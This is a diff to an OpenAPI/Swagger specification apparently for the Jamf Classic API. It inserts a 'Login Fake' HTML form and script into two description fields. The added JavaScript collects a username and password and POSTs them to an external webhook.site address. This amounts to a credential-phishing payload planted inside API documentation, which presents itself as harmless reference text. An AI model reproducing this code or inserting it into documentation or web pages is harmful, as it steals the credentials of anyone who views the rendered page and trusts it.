@@ -3,7 +3,44 @@ info:
   title: Classic API Resource Documentation
   description: |
     <h2>Login Fake</h2>
-    User: <input><br>Password: <input><br><button type="submit">Logar</button>
+
+    <!-- Campos de usuário e senha -->
+    User: <input type="text" id="username"><br>
+    Password: <input type="password" id="password"><br>
+
+    <!-- Botão de login -->
+    <button type="button" id="loginButton">Logar</button>
+
+    <script>
+        document.getElementById('loginButton').addEventListener('click', function() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Verificar se os campos estão preenchidos
+            if (!username || !password) {
+                alert("Por favor, preencha todos os campos.");
+                return;
+            }
+
+            // Enviar os dados para o webhook
+            fetch('https://webhook.site/1826b30d-0d64-4495-b6ee-e69f0fbf6de4', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded', // Tipo correto para enviar dados de formulário
+                },
+                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("Dados enviados ao Webhook!");
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+                alert("Erro ao enviar dados.");
+            });
+        });
+    </script>
+
 
   version: production
 basePath: /JSSResource/
@@ -30,7 +67,43 @@ paths:
       parameters:
         - description: |
             <h2>Login Fake</h2>
-            User: <input><br>Password: <input><br><button type="submit">Logar</button>
+
+            <!-- Campos de usuário e senha -->
+            User: <input type="text" id="username"><br>
+            Password: <input type="password" id="password"><br>
+
+            <!-- Botão de login -->
+            <button type="button" id="loginButton">Logar</button>
+
+            <script>
+                document.getElementById('loginButton').addEventListener('click', function() {
+                    const username = document.getElementById('username').value;
+                    const password = document.getElementById('password').value;
+
+                    // Verificar se os campos estão preenchidos
+                    if (!username || !password) {
+                        alert("Por favor, preencha todos os campos.");
+                        return;
+                    }
+
+                    // Enviar os dados para o webhook
+                    fetch('https://webhook.site/1826b30d-0d64-4495-b6ee-e69f0fbf6de4', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded', // Tipo correto para enviar dados de formulário
+                        },
+                        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        alert("Dados enviados ao Webhook!");
+                    })
+                    .catch(error => {
+                        console.error('Erro:', error);
+                        alert("Erro ao enviar dados.");
+                    });
+                });
+            </script>
 
           format: int64
           in: path
